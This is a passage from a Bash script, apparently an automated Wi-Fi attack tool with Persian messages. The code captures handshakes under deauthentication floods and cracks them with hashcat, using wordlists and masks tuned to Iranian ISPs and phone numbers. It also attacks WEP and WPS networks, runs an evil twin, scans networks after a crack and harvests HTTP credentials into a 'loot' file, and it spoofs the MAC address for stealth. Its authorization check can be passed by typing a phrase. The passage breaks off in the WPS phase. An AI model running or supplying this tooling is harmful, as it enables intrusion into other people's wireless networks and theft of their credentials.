if [ "$OFFLINE" -eq 1 ] && [ "$DRY_RUN" -ne 1 ] && [ ! -s "$CAP" ]; then
  err "فایل pcap یافت نشد یا خالی است: $CAP"; exit 1
fi

print_plan() {
  banner
  printf '  %sSIMULATION MODE%s — dry-run / --simulate\n' "$_warn" "$_rst"
  printf '%s╭─ %sRUN PLAN%s  %s(dry-run — nothing will run)%s\n' "$_mag" "$_bold" "$_rst" "$_dim" "$_rst"
  printf '│ %s\n' "Profile: $PROFILE"
  printf '│ %s\n' "Capture: ${CAPTURE:-120}s"
  printf '│ %s\n' "Workload: $WLIMIT"
  printf '│ %s\n' "Session: $SESSION$([ "$RESTORE" -eq 1 ] && printf ' (restore)')"
  [ "$AUTO" -eq 1 ] && printf '│ %s\n' "Mode: auto (one-click)"
  [ "$PMKID_ONLY" -eq 1 ] && printf '│ %s\n' "Mode: PMKID-only (fast path, ${CAPTURE}s capture)"
  [ "$DO_WPS" -eq 1 ] && printf '│ %s\n' "WPS: NULL PIN → common/algorithmic → Pixie Dust → bully (lockout-aware, resume)"
  [ "$WEP" -eq 1 ] && printf '│ %s\n' "Mode: WEP cracking (ARP replay / chopchop / fragmentation)"
  [ "$OFFLINE" -eq 1 ] && printf '│ %s\n' "Mode: offline / crack-only (from-pcap: $FROM_PCAP)"
  [ "$RESUME" -eq 1 ] && printf '│ %s\n' "Mode: resume (skip to phase $SKIP_TO)"
  [ "$INTERACTIVE" -eq 1 ] && printf '│ %s\n' "Mode: interactive target picker"
  [ -n "$TARGET" ] && printf '│ %s\n' "Target: $TARGET"
  if [ -n "$SCOPE_FILE" ]; then printf '│ %s\n' "Scope: $SCOPE_FILE"; else printf '│ %s\n' "Scope: (none — all networks in range)"; fi
  if [ "$ALLOW_ALL" -eq 1 ]; then printf '│ %s\n' "Allow-all: yes (no scope file)"; fi
  if [ "$AUTHORIZED" -eq 1 ]; then printf '│ %s\n' "Authorization: acknowledged"; else printf '│ %s\n' "Authorization: NOT acknowledged (active attacks blocked)"; fi
  [ -n "$IFACE" ] && printf '│ %s\n' "Interface: $IFACE"
  [ "${DEFAULT_PSK:-1}" -eq 1 ] && printf '│ %s\n' "Default PSK: enabled (SpeedTouch/Thomson + common + MAC-derived, zero GPU)"
  [ "${CONFIG_EXTRACT:-1}" -eq 1 ] && printf '│ %s\n' "Config extract: enabled (TR-064/UPnP, SNMP, Telnet/SSH, Web, WPS)"
  [ -n "$WORDLIST" ] && printf '│ %s\n' "Wordlist: $WORDLIST"
  printf '%s╰──────────────────────────────────────────────────────%s\n' "$_dim" "$_rst"
  printf '\n%s▌%s %sPLANNED EXECUTION%s\n' "$_mag" "$_rst" "$_bold" "$_rst"
  cat <<'PLAN'

[0] Setup
    airmon-ng check kill
    airmon-ng start $IFACE
    macchanger -r $MON  (stealth only)

[0.5] Passive recon (if kismet installed)
    timeout 30 kismet -c $MON

PLAN
  echo "[1] Capture (${CAPTURE:-120}s)"
  cat <<'PLAN'
    hcxdumptool -i $MON -o $CAP [filterlist_ap=$TARGET]
    mdk4 $MON d -b $WORK/blacklist  (background, every 5s)
    airodump-ng --band abg --output-format csv -w $WORK/scan $MON
    tshark -r $CAP -Y 'eap' -T fields -e wlan.sa -e eap.identity
    tshark -r $CAP -Y 'wps' -T fields -e wlan.bssid

[2] Extract & normalize
    hcxpcapngtool -o $WORK/raw.hc22000 -E $WORK/essids.txt --eapmschapv2=$WORK/mschapv2.txt $CAP
    hcxhashtool -i $WORK/raw.hc22000 -o $HASH --essid-group
    Handshake quality scoring (PMKID / 4-way EAPOL / MIC) — re-capture if incomplete

[3] Crack (hashcat layers 1-8)
    1: hashcat -m 22000 -a 0 $HASH $WORK/dicts/vendor.txt
    2: hashcat -m 22000 -a 0 $HASH <wordlist>
    3: hashcat -m 22000 -a 0 $HASH <wordlist> -r best64.rule
    4: hashcat -m 22000 -a 3 $HASH '?d?d?d?d?d?d?d?d'
    5: hashcat -m 22000 -a 3 $HASH '?d?d?d?d?d?d?d?d?d?d'
    6: hashcat -m 22000 -a 3 $HASH '09?d?d?d?d?d?d?d?d?d'
    7: hashcat -m 22000 -a 6 $HASH $WORK/dicts/vendor.txt '?d?d?d?d'
    8: hashcat -m 22000 -a 0 $HASH <wordlist> -r OneRuleToRuleThemAll.rule
    E: hashcat -m 5500 $WORK/mschapv2.txt <wordlist>  (Enterprise)

[4] WPS (if DO_WPS and WPS-enabled APs found)
    wash -i $MON -o $WORK/wps-scan.txt
    reaver -i $MON -b <bssid> -c <ch> -K 1 -N -vv -d 5
    bully -b <bssid> -c <ch> -d $WORK/bully-<bssid> $MON

[5] Evil Twin (if no cracks and DO_TWIN)
    hostapd-mana $WORK/mana.conf  (or wifiphisher)
    sleep 180

[6] Post-exploit (if cracks found and DO_POST)
    nmap -sn $SUBNET   (auto-detected or 192.168.1.0/24)
    nmap -sV -p 22,80,443,445,3389,8080 $SUBNET
    generate $REPORT/connect.sh (nmcli + bettercap)

[6.5] HTTP credential harvesting (if cracked and DO_HARVEST)
    tshark -r $CAP -Y 'http.authorization' ...  (Basic auth)
    tshark -r $CAP -Y 'http.request.method==POST' ...  (form creds)
    timeout $HARVEST_TIME tshark -i $MON -Y http -w $WORK/http-live.pcapng
    → $REPORT/loot.tsv  (loot database)
    → $REPORT/loot.json

[7] Report
    $REPORT/summary.md
    $REPORT/summary.json
PLAN
  echo
  echo "✓ Simulation complete. No changes were made."
  echo
}

[ "$DRY_RUN" = 1 ] && { print_plan; exit 0; }

banner

command -v hashcat >/dev/null || warn "hashcat نصب نیست؛ cracking غیرفعال می‌شود."
if [ "$OFFLINE" -eq 1 ]; then
  command -v hcxpcapngtool >/dev/null || warn "hcxpcapngtool نصب نیست؛ استخراج غیرفعال می‌شود."
else
  if [ "${WIFITE4_TEST_MODE:-0}" != "1" ]; then (( EUID == 0 )) || { err "با sudo اجرا کن."; exit 1; }; fi
  command -v hcxdumptool >/dev/null || warn "hcxdumptool نصب نیست؛ برداشت غیرفعال می‌شود."
  command -v iw >/dev/null || warn "iw نصب نیست؛ آماده‌سازی رادیو غیرفعال می‌شود."
  command -v mdk4 >/dev/null || warn "mdk4 نصب نیست؛ دِاوث ضعیف‌تر می‌شود."
fi

# ---------- اعتبارسنجی scope و اجازهٔ صریح ----------
if [ "$OFFLINE" -ne 1 ] && [ "$DRY_RUN" -ne 1 ]; then
  if [ "$AUTHORIZED" -ne 1 ]; then
    if [ -t 0 ]; then
      echo
      warn "حملات فعال نیازمند اجازهٔ صریح (written authorization) هستند."
      read -rp "برای ادامه عبارت 'I HAVE AUTHORIZATION' را تایپ کن: " _ack
      if [ "$_ack" != "I HAVE AUTHORIZATION" ]; then
        err "اجازه تأیید نشد. خروج."; exit 1
      fi
      AUTHORIZED=1
    else
      err "حملات فعال نیازمند --authorize دارند (اجازهٔ کتبی). خروج."; exit 1
    fi
  fi
  if [ -n "$SCOPE_FILE" ]; then
    [ -f "$SCOPE_FILE" ] || { err "فایل scope یافت نشد: $SCOPE_FILE"; exit 1; }
    ok "scope بارگذاری شد: $SCOPE_FILE"
  else
    if [ "$ALLOW_ALL" -eq 1 ]; then
      ok "--allow-all: همهٔ شبکه‌های محدوده مجاز تلقی می‌شوند."
    elif [ -t 0 ]; then
      echo
      warn "هیچ --scope داده نشد: همهٔ شبکه‌های محدوده مجاز تلقی می‌شوند."
      read -rp "برای ادامه عبارت 'ALLOW ALL' را تایپ کن: " _ack2
      if [ "$_ack2" != "ALLOW ALL" ]; then
        err "اجازهٔ all-networks تأیید نشد. خروج."; exit 1
      fi
      ALLOW_ALL=1
    else
      err "بدون --scope، برای اجرای حملات فعال باید --allow-all بدهید (اجازهٔ کتبی). خروج."; exit 1
    fi
  fi
fi

# ---------- پاکسازی ----------
_CLEANED=0
cleanup(){
  [ "$_CLEANED" = 1 ] && return
  _CLEANED=1
  [ -n "${HK_PID:-}" ] && { kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; }
  [ -n "${MDK_PID:-}" ] && { kill "$MDK_PID" 2>/dev/null; wait "$MDK_PID" 2>/dev/null; }
  [ -n "${SCAN_PID:-}" ] && { kill "$SCAN_PID" 2>/dev/null; wait "$SCAN_PID" 2>/dev/null; }
  [ -n "${TWIN_PID:-}" ] && { kill "$TWIN_PID" 2>/dev/null; wait "$TWIN_PID" 2>/dev/null; }
  # kill any orphaned child processes (mdk4, airodump-ng, hcxdumptool, ...)
  pkill -P $$ 2>/dev/null || true
  [ -n "${MON:-}" ] && airmon-ng stop "$MON" >/dev/null 2>&1
  # revert macchanger if applied
  if [ -n "${ORIG_MAC:-}" ] && [ -n "${MON:-}" ]; then
    ip link set "$MON" down 2>/dev/null
    ip link set "$MON" address "$ORIG_MAC" 2>/dev/null
    ip link set "$MON" up 2>/dev/null
  fi
  for i in "$IFACE" "$IFACE2"; do [ -n "$i" ] && ip link set "$i" up 2>/dev/null; done
  systemctl restart NetworkManager >/dev/null 2>&1 || true
  hr; c "خروجی‌ها: ${WORK:-}"
}
trap cleanup EXIT
trap 'cleanup; exit 129' HUP
trap 'cleanup; exit 130' INT
trap 'cleanup; exit 131' QUIT
trap 'cleanup; exit 143' TERM

# ---------- فاز ۰: آماده‌سازی ----------
if [ "$OFFLINE" -ne 1 ] && command -v airmon-ng >/dev/null 2>&1 && command -v iw >/dev/null 2>&1; then
  phase "فاز ۰ — آماده‌سازی"
  if [ -z "$IFACE" ]; then IFACE=$(iw dev | awk '/Interface/{print $2; exit}'); fi
  [ -n "$IFACE" ] || { err "دانگل وای‌فای پیدا نشد."; exit 1; }

  if [ -z "$IFACE2" ]; then
    IFACE2=$(iw dev | awk -v skip="$IFACE" '/Interface/ && $2 != skip {print $2; exit}')
  fi
  if [ -n "$IFACE2" ]; then
    ok "دانگل دوم برای evil twin: $IFACE2"
  else
    warn "دانگل دوم نیست؛ twin غیرفعال."; DO_TWIN=0
  fi

  if command -v hashcat >/dev/null 2>&1; then
    c "تشخیص GPU / بنچمارک hashcat..."
    hashcat -I > "$WORK/hashcat-info.txt" 2>&1
    if grep -qiE 'Type\.+: (GPU|CUDA|HIP)' "$WORK/hashcat-info.txt"; then
    ok "GPU شناسایی شد."
  elif grep -qi 'OpenCL' "$WORK/hashcat-info.txt"; then
    warn "فقط CPU/OpenCL؛ کند خواهد بود."
  else
    err "hashcat هیچ بک‌اندی ندارد. درایور OpenCL نصب کن."
  fi
  else
    warn "hashcat یافت نشد؛ تشخیص GPU رد شد."
  fi

  airmon-ng check kill >/dev/null 2>&1
  BEFORE=$(iw dev | awk '/Interface/{print $2}')
  airmon-ng start "$IFACE" >/dev/null 2>&1
  AFTER=$(iw dev | awk '/Interface/{print $2}')
  MON=$(comm -13 <(sort <<<"$BEFORE") <(sort <<<"$AFTER") | head -1)
  [ -z "$MON" ] && MON="$IFACE"
  iw dev "$MON" info 2>/dev/null | grep -q monitor || {
    ip link set "$MON" down; iw dev "$MON" set type monitor; ip link set "$MON" up; }
  iw dev "$MON" info 2>/dev/null | grep -q monitor || { err "مانیتور مود نشد."; exit 1; }
  ok "مانیتور مود: $MON"

  # MAC رندوم برای مخفی‌کاری در حالت stealth
  if [ "$PROFILE" = stealth ]; then
    ORIG_MAC=$(ip link show "$MON" 2>/dev/null | awk '/link\/ether/{print $2; exit}')
    ip link set "$MON" down
    macchanger -r "$MON" >/dev/null 2>&1 || true
    ip link set "$MON" up
    ok "MAC رندوم شد."
  fi
else
  if [ "$OFFLINE" -eq 1 ]; then
    c "حالت offline/crack-only: فاز ۰ (radio) رد شد."
  else
    warn "airmon-ng یا iw یافت نشد — فاز ۰ (آماده‌سازی رادیو) رد شد."
  fi
  MON=""
  DO_TWIN=0
  DO_WPS=0
fi

# ---------- انتخاب خودکار هدف (--auto) ----------
if [ "$AUTO" -eq 1 ] && [ -z "${TARGET:-}" ] && [ -n "${MON:-}" ] && command -v airodump-ng >/dev/null 2>&1; then
  hr; c "حالت auto: اسکن کوتاه برای انتخاب قوی‌ترین شبکهٔ WPA2"
  SCAN_CSV="$WORK/autoscan"
  timeout 20 airodump-ng --write "$SCAN_CSV" --output-format csv "$MON" >/dev/null 2>&1 || true
  TARGET=$(awk -F, '
    $1 ~ /^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:/ {
      bssid=$1; pwr=$9; priv=$6
      gsub(/^[ \t]+|[ \t]+$/, "", bssid)
      gsub(/^[ \t]+|[ \t]+$/, "", pwr)
      gsub(/^[ \t]+|[ \t]+$/, "", priv)
      if (priv ~ /WPA2/ && pwr ~ /^-?[0-9]+$/) {
        if (best == "" || pwr+0 > bestpwr+0) { best=bssid; bestpwr=pwr }
      }
    }
    END { if (best != "") print best }
  ' "${SCAN_CSV}-01.csv" 2>/dev/null)
  if [ -n "${TARGET:-}" ]; then
    ok "هدف انتخاب‌شده (auto): $TARGET"
  else
    warn "هیچ شبکهٔ WPA2 در اسکن یافت نشد."
  fi
fi

# ---------- فاز WEP: کرک شبکه‌های WEP ----------
if [ "$WEP" -eq 1 ] && [ "$OFFLINE" -ne 1 ] && [ -n "${MON:-}" ]; then
  phase "فاز WEP — کرک شبکه‌های WEP (ARP replay / chopchop / fragmentation)"
  if ! command -v airodump-ng >/dev/null 2>&1 || ! command -v aircrack-ng >/dev/null 2>&1; then
    warn "airdump-ng/aircrack-ng یافت نشد — فاز WEP رد شد."
  else
    WEPSCAN="$WORK/wep-scan"
    timeout 20 airodump-ng --output-format csv -w "$WEPSCAN" "$MON" >/dev/null 2>&1 || true
    awk -F, '$1 ~ /^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:/ {
      b=$1; p=$6; ch=$4
      gsub(/^[ \t]+|[ \t]+$/, "", b); gsub(/^[ \t]+|[ \t]+$/, "", p); gsub(/^[ \t]+|[ \t]+$/, "", ch)
      if (p ~ /WEP/) print b, ch
    }' "${WEPSCAN}-01.csv" 2>/dev/null | sort -u | while read -r b ch; do
      [ -z "$b" ] && continue
      in_scope "$b" "" || { warn "  $b خارج از scope — رد شد."; continue; }
      crack_wep "$b" "$ch"
    done
  fi
fi

# ---------- فاز ۰.۵: شناسایی منفعل (kismet) ----------
if [ "$SKIP_TO" -le 1 ] && [ "$OFFLINE" -ne 1 ] && command -v kismet >/dev/null; then
  phase "فاز ۰.۵ — شناسایی منفعل با kismet"
  timeout 30 kismet -c "$MON" >/dev/null 2>&1 || true
  ok "شناسایی منفعل کامل شد."
  save_checkpoint 1
fi

# جمع‌آوری اهداف از CSV ایرودامپ (مبنای جدول و منوی انتخاب)
collect_targets(){
  local csv="${1:-$WORK/scan-01.csv}"
  TARGET_ROWS=""
  [ -s "$csv" ] || return 0
  TARGET_ROWS=$(awk -F',' '
    NR > 1 && $1 ~ /^[[:space:]]*[0-9A-Fa-f:]{17}[[:space:]]*$/ {
      b=$1; gsub(/[[:space:]]/, "", b)
      ch=$4; gsub(/[[:space:]]/, "", ch)
      p=$9; gsub(/[[:space:]]/, "", p)
      enc=$6; gsub(/^[[:space:]]+|[[:space:]]+$/, "", enc)
      e=$14; gsub(/^[[:space:]]+|[[:space:]]+$/, "", e)
      if (e == "") e = "(hidden)"
      printf "%s|%s|%s|%s|%s\n", b, ch, p, enc, e
    }' "$csv" | sort -u | head -20)
}

# جدول اهداف (ویژگی بصری اصلی، مثل wifite2)
show_targets(){
  [ -n "${TARGET_ROWS:-}" ] || return 0
  local i=0 b ch p enc e
  printf '\n  %s%-3s %-17s %-3s %-5s %-13s %s%s\n' "$_bold" "#" "BSSID" "CH" "PWR" "ENC" "ESSID" "$_rst"
  while IFS='|' read -r b ch p enc e; do
    i=$((i + 1))
    printf '  %s%2d%s  %-17s %-3s %-5s %-13s %s%s%s\n' \
      "$_c" "$i" "$_rst" "$b" "$ch" "$p" "${enc:0:13}" "$_ok" "$e" "$_rst"
  done < <(printf '%s\n' "$TARGET_ROWS")
  printf '  %s%d network(s) discovered%s\n' "$_dim" "$i" "$_rst"
}

# انتخاب تعاملی هدف با شماره (--interactive)
select_target(){
  [ "$INTERACTIVE" -eq 1 ] || return 0
  [ -n "${TARGET:-}" ] && return 0
  [ -n "${TARGET_ROWS:-}" ] || { warn "هدف قابل انتخابی پیدا نشد."; return 0; }
  local total choice line b ch p enc e
  total=$(printf '%s\n' "$TARGET_ROWS" | wc -l)
  printf '\n%s?%s شمارهٔ هدف را انتخاب کن [1-%d] (Enter = همه، q = انصراف): ' "$_ok" "$_rst" "$total"
  if ! IFS= read -r choice; then
    warn "ورودی تمام شد؛ ادامه با همهٔ اهداف."
    return 0
  fi
  case "$choice" in
    ''|0) ok "همهٔ شبکه‌ها انتخاب شد."; return 0 ;;
    q|Q) warn "انتخاب هدف رد شد؛ ادامه با همه."; return 0 ;;
  esac
  if ! [[ "$choice" =~ ^[0-9]+$ ]]; then
    warn "شمارهٔ نامعتبر: $choice — ادامه با همه."
    return 0
  fi
  line=$(printf '%s\n' "$TARGET_ROWS" | sed -n "${choice}p")
  if [ -z "$line" ]; then
    warn "شماره خارج از بازه — ادامه با همه."
    return 0
  fi
  IFS='|' read -r b ch p enc e <<< "$line"
  if ! in_scope "$b" "$e"; then
    err "هدف انتخاب‌شده خارج از scope است — رد شد."
    return 1
  fi
  TARGET="$b"; TARGET_ESSID="$e"
  ok "هدف انتخاب شد: $e ($b) — کانال $ch، $enc"
}

# ---------- فاز ۱: برداشت ----------
if [ "$SKIP_TO" -le 2 ] && [ "$OFFLINE" -ne 1 ] && command -v hcxdumptool >/dev/null 2>&1 && command -v airodump-ng >/dev/null 2>&1; then
  if [ -n "${TARGET:-}" ] && ! in_scope "$TARGET" ""; then
    err "هدف $TARGET خارج از scope است. خروج."; exit 1
  fi
phase "فاز ۱ — برداشت PMKID + EAPOL + EAP برای ${CAPTURE} ثانیه"

# انتخاب تعاملی هدف: اسکن کوتاه، جدول، سپس برداشت فیلترشده
if [ "$INTERACTIVE" -eq 1 ] && [ -z "$TARGET" ] && command -v airodump-ng >/dev/null 2>&1; then
  c "اسکن اولیه ۱۵ ثانیه برای انتخاب هدف…"
  timeout 15 airodump-ng --band abg --output-format csv -w "$WORK/prescan" "$MON" >/dev/null 2>&1 || true
  collect_targets "$WORK/prescan-01.csv"
  if [ -n "${TARGET_ROWS:-}" ]; then
    show_targets
    select_target || exit 1
  else
    warn "در اسکن اولیه شبکه‌ای دیده نشد؛ برداشت از همه."
  fi
fi

capture_once || exit 1

# دِاوث دوره‌ای با mdk4 برای اجبار به reassociation (در PMKID-only غیرفعال)
if [ "$PMKID_ONLY" -ne 1 ] && command -v mdk4 >/dev/null; then
  ( sleep 5; exec mdk4 "$MON" d -b "$WORK/blacklist" ) >/dev/null 2>&1 &
  MDK_PID=$!
fi

# اسکن موازی برای شناسایی Enterprise و WPS
airodump-ng --band abg --output-format csv -w "$WORK/scan" "$MON" >/dev/null 2>&1 &
SCAN_PID=$!

wait_bar "$CAPTURE" "capture"
kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; HK_PID=""
kill "$SCAN_PID" 2>/dev/null; wait "$SCAN_PID" 2>/dev/null
kill "$MDK_PID" 2>/dev/null; MDK_PID=""

if [ -s "$CAP" ]; then
  ok "برداشت: $(du -h "$CAP" | cut -f1)"
else
  err "هیچ داده‌ای گرفته نشد."; exit 1
fi

# tshark: تحلیل بسته‌ها برای شناسایی Enterprise/WPS/کلاینت‌ها
if command -v tshark >/dev/null; then
  c "  → tshark تحلیل بسته‌ها"
  tshark -r "$CAP" -Y 'eap' -T fields -e wlan.sa -e eap.identity 2>/dev/null | sort -u > "$WORK/eap-idents.txt"
  tshark -r "$CAP" -Y 'wps' -T fields -e wlan.bssid 2>/dev/null | sort -u > "$WORK/wps-bssids.txt"
  [ -s "$WORK/eap-idents.txt" ] && ok "EAP identities: $(wc -l < "$WORK/eap-idents.txt")"
  [ -s "$WORK/wps-bssids.txt" ] && ok "WPS BSSIDs: $(wc -l < "$WORK/wps-bssids.txt")"
fi

  save_checkpoint 2
else
  if [ "$OFFLINE" -ne 1 ]; then
    warn "hcxdumptool یا airodump-ng یافت نشد — فاز ۱ (برداشت) رد شد."
  fi
fi

# ---------- فاز ۲: نرمال‌سازی ----------
if [ "$SKIP_TO" -le 3 ] && command -v hcxpcapngtool >/dev/null 2>&1; then
phase "فاز ۲ — استخراج و حذف تکراری"
extract_hashes

# در حالت PMKID-only، اگر PMKID یافت شد مستقیم به کرک برو (رد WPS/Evil-Twin)
if [ "$PMKID_ONLY" -eq 1 ] && [ "${PMKID_N:-0}" -gt 0 ]; then
  ok "PMKID یافت شد ($PMKID_N) — رد کردن WPS/Evil-Twin، مستقیم به کرک."
  DO_WPS=0
  DO_TWIN=0
elif [ "$PMKID_ONLY" -eq 1 ]; then
  warn "PMKID یافت نشد؛ ادامه با مسیر کامل (WPS/Evil-Twin فعال)."
fi

  collect_targets
  show_targets
  save_checkpoint 3
else
  warn "hcxpcapngtool یافت نشد — فاز ۲ (استخراج) رد شد."
fi

# ---------- ارزیابی کیفیت handshake ----------
# (فقط قبل از فاز کرک اجرا می‌شود؛ در resume از فاز ۴ به بعد رد می‌شود)
if [ "${SKIP_TO:-0}" -le 4 ]; then
# بازمحاسبهٔ شمارنده‌ها در صورت resume
if [ "${PMKID_N:-0}" -eq 0 ] && [ -s "${HASH:-}" ]; then
  PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
  EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
  PMKID_N=${PMKID_N:-0}; EAPOL_N=${EAPOL_N:-0}
fi

handshake_quality
c "کیفیت handshake: $HS_SCORE/3 (PMKID=${PMKID_N:-0}, EAPOL=${EAPOL_N:-0})"

# در صورت ناقص بودن، یک بار re-capture انجام بده
CRACK_ENABLED=1
  if [ "$HS_OK" -ne 1 ] && [ "$OFFLINE" -ne 1 ]; then
    warn "handshake ناقص است؛ تلاش برای re-capture..."
    if [ -n "${MON:-}" ] && command -v hcxdumptool >/dev/null 2>&1; then
      rm -f "$CAP" 2>/dev/null
      if capture_once; then
        sleep 10
        kill "${HK_PID:-}" 2>/dev/null; wait "${HK_PID:-}" 2>/dev/null; HK_PID=""
        if [ -s "$CAP" ]; then
          extract_hashes
          handshake_quality
          c "کیفیت handshake پس از re-capture: $HS_SCORE/3"
        fi
      fi
    fi
    if [ "$HS_OK" -ne 1 ]; then
      warn "handshake همچنان ناقص است؛ cracking رد می‌شود."
      CRACK_ENABLED=0
    fi
  fi

fi

# Offline/crack-only (--from-pcap): همیشه cracking را روی pcap تأمین‌شده اجرا کن،
# حتی اگر handshake ناقص امتیاز گرفته باشد، تا منطق کرک بدون سخت‌افزار رادیو قابل تست باشد.
[ "$OFFLINE" -eq 1 ] && CRACK_ENABLED=1


# ---------- PSK پیش‌فرض (zero GPU) ----------
if [ "$SKIP_TO" -le 4 ] && [ "${DEFAULT_PSK:-1}" -eq 1 ] && [ -s "${CAP:-}" ] && command -v aircrack-ng >/dev/null 2>&1; then
  phase "فاز ۳.۰ — PSK پیش‌فرض (zero GPU)"
  _essid=$(head -1 "$WORK/essids.txt" 2>/dev/null)
  _bssid="${TARGET:-}"
  [ -z "$_bssid" ] && _bssid=$(awk -F, 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/{print $1; exit}' "$WORK/scan-01.csv" 2>/dev/null | tr -d ' ')
  _cand="$WORK/default-psk-candidates.txt"
  derive_default_psks "$_bssid" "$_essid" | sort -u > "$_cand" 2>/dev/null
  if [ -s "$_cand" ]; then
    c "  → aircrack-ng با $(wc -l < "$_cand") کاندید"
    aircrack-ng -w "$_cand" ${_essid:+-e "$_essid"} "$CAP" > "$WORK/default-psk-crack.txt" 2>&1 || true
    _key=$(grep -i 'KEY FOUND' "$WORK/default-psk-crack.txt" | sed 's/.*\[ //;s/ \].*//' | head -1)
    if [ -n "$_key" ]; then
      ok "PSK پیش‌فرض یافت شد: $_key"
      [ -n "$_bssid" ] && echo "$_bssid|$_key|default-psk" >> "$WORK/cracked.txt"
      CRACK_ENABLED=0
    else
      warn "PSK پیش‌فرض یافت نشد؛ ادامه با hashcat."
    fi
  fi
fi

# ---------- بازیابی نشست hashcat (--restore) ----------
if [ "$RESTORE" -eq 1 ] && [ "$SKIP_TO" -le 4 ] && command -v hashcat >/dev/null 2>&1; then
  phase "فاز ۳ — بازیابی نشست hashcat ($SESSION)"
  timeout 900 "${HC_BASE[@]}" --restore >> "$WORK/hc.log" 2>&1
  save_checkpoint 4
fi

# ---------- فاز ۳: موتور کرک ----------
if [ "$RESTORE" -eq 0 ] && [ "$SKIP_TO" -le 4 ] && [ "${CRACK_ENABLED:-1}" -eq 1 ] && command -v hashcat >/dev/null 2>&1; then
phase "فاز ۳ — موتور کرک مرحله‌ای"


build_dicts(){
  D="$WORK/dicts"; mkdir -p "$D"
  # پیش‌فرض‌های وندور بر اساس SSID
  : > "$D/vendor.txt"
  [ -s "$WORK/essids.txt" ] || return 0
  while IFS= read -r e; do
    [ -z "$e" ] && continue
    printf '%s\n' "$e" "$e"123 "$e"1234 "${e,,}" "${e^^}" "${e//[^A-Za-z0-9]/}" >> "$D/vendor.txt"
    # پسوندهای رایج ISP ایران
    for s in 1234 12345 123456 12345678 1111 0000 1 12 123 1375 1380 1390 1400; do
      printf '%s%s\n' "$e" "$s" >> "$D/vendor.txt"
    done
    # پیشوندهای اپراتور
    case "$e" in
      *[Mm]obi*|*[Ii]rancell*)
        printf '%s\n' 1234 12345 123456 11111111 00000000 >> "$D/vendor.txt";;
      *[Tt][Dd]-*|*[Zz][Tt][Ee]*|*[Dd]-[Ll]ink*|*[Dd]link*|*[Tt][Pp]-[Ll]ink*|*[Tt]plink*)
        printf 'admin\npassword\n12345678\n1234567890\n' >> "$D/vendor.txt";;
    esac
    done < "$WORK/essids.txt"
  sort -u "$D/vendor.txt" -o "$D/vendor.txt"
}

cracked_count(){ hashcat -m 22000 "$HASH" --show --potfile-path "$POT" 2>/dev/null | wc -l; }
total_count(){ wc -l < "$HASH" 2>/dev/null || echo 0; }

run_hc(){
  local label="$1"; shift
  [ -s "$HASH" ] || return 0
  local tot cr; tot=$(total_count); cr=$(cracked_count)
  [ "$cr" -ge "$tot" ] && return 0
  c "  → $label  ($cr/$tot)"
  timeout 900 "${HC_BASE[@]}" --status --status-timer=30 "$HASH" "$@" >> "$WORK/hc.log" 2>&1
}

build_dicts
RULES=/usr/share/hashcat/rules
WORDLISTS=()
[ -n "$WORDLIST" ] && [ -f "$WORDLIST" ] && WORDLISTS+=("$WORDLIST")
for f in "$DICTDIR"/rockyou.txt "$DICTDIR"/weakpass*.txt "$DICTDIR"/hashmob*.txt \
         /usr/share/wordlists/rockyou.txt; do
  [ -f "$f" ] && WORDLISTS+=("$f")
done
[ ${#WORDLISTS[@]} -eq 0 ] && { warn "هیچ وردلیستی نبود؛ فقط ماسک اجرا می‌شود."; WORDLISTS=("$WORK/dicts/vendor.txt"); }

# لایه ۱: دیکشنری مشتق از SSID + پیش‌فرض وندور
run_hc "دیکشنری SSID/وندور" -a 0 "$WORK/dicts/vendor.txt"

# لایه ۲: rockyou بدون rule
run_hc "rockyou خام" -a 0 "${WORDLISTS[0]}"

# لایه ۳: rockyou + best64
[ -f "$RULES/best64.rule" ] && run_hc "rockyou + best64" -a 0 "${WORDLISTS[0]}" -r "$RULES/best64.rule"

# لایه ۴: ماسک‌های عددی رایج (۸ و ۱۰ رقم)
run_hc "ماسک ۸ رقمی" -a 3 '?d?d?d?d?d?d?d?d'
run_hc "ماسک ۱۰ رقمی" -a 3 '?d?d?d?d?d?d?d?d?d?d'
run_hc "موبایل ایرانی" -a 3 '09?d?d?d?d?d?d?d?d?d'

# لایه ۵: هیبرید دیکشنری + ۴ رقم
[ -s "$WORK/dicts/vendor.txt" ] && run_hc "هیبرید SSID + ۴ رقم" -a 6 "$WORK/dicts/vendor.txt" '?d?d?d?d'

# لایه ۶: weakpass / hashmob با rule
for w in "${WORDLISTS[@]:1}"; do
  [ -f "$w" ] || continue
  if [ -f "$RULES/OneRuleToRuleThemAll.rule" ]; then
    run_hc "$(basename "$w") + OneRule" -a 0 "$w" -r "$RULES/OneRuleToRuleThemAll.rule"
  else
    run_hc "$(basename "$w") خام" -a 0 "$w"
  fi
done

# لایه ۸: Enterprise MSCHAPv2
if [ -s "$WORK/mschapv2.txt" ]; then
  phase "فاز ۳ب — کرک Enterprise (MSCHAPv2)"
  timeout 600 hashcat -m 5500 --potfile-path "$POT" -w "$WLIMIT" --force --session "${SESSION}-ent" \
    "$WORK/mschapv2.txt" "${WORDLISTS[0]}" >> "$WORK/hc.log" 2>&1
  hashcat -m 5500 "$WORK/mschapv2.txt" --show --potfile-path "$POT" 2>/dev/null \
    >> "$WORK/enterprise-cracked.txt"
fi

  save_checkpoint 4
fi

# ---------- فاز ۴: WPS Pixie Dust + Brute ----------
if [ "$SKIP_TO" -le 5 ] && [ "$DO_WPS" -eq 1 ] && [ -f "$WORK/scan-01.csv" ] && { command -v reaver >/dev/null 2>&1 || command -v bully >/dev/null 2>&1; }; then
  phase "فاز ۴ — WPS (Pixie Dust + Brute)"
  # wash: اسکن دقیق WPS-enabled APها (بهتر از parsing CSV)
  parse_wps_csv() {
    awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x); c=$4; gsub(/ /,"",c); print x, c}' \
      "$WORK/scan-01.csv" | sort -u
  }
  if command -v wash >/dev/null; then
    timeout 15 wash -i "$MON" -o "$WORK/wps-scan.txt" >/dev/null 2>&1 || true
    if [ -s "$WORK/wps-scan.txt" ]; then
      awk '{print $1, $6}' "$WORK/wps-scan.txt" | sort -u > "$WORK/wps-cands.txt"
    else
